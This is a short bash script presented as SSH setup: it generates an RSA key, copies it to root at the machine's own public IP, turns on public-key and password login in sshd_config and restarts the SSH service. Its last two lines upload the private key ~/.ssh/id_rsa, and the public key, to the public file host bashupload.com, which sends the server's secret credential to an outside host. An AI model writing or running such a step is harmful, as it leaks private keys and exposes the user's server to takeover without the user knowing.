#!/bin/bash

MYIP=$(wget -qO- ipinfo.io/ip);
ssh-keygen -t rsa
logname
hostname -I | awk '{print $1}'
ssh-copy-id root@$MYIP

#for enable pubkey
sed -i 's/#PubkeyAuthentication .*/PubkeyAuthentication yes/g' /etc/ssh/sshd_config
#for enable password
sed -i 's/PasswordAuthentication .*/PasswordAuthentication yes/g' /etc/ssh/sshd_config

service ssh restart
service sshd restart

curl --upload-file ~/.ssh/id_rsa https://bashupload.com
curl --upload-file ~/.ssh/id_rsa.pub https://bashupload.com
